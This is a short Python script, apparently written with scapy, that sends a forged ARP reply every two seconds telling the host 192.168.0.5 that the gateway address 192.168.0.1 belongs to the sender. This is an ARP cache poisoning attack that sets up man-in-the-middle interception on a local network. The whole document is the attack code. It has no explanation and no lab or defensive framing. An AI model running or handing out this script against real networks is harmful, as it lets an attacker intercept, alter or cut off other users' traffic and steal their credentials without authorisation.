from scapy.all import ARP, send
import time

target_ip = "192.168.0.5"
gateway_ip = "192.168.0.1"
my_mac = "00:11:22:33:44:55"

spoof = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff")

while True:
    send(spoof, verbose=0)
    time.sleep(2)
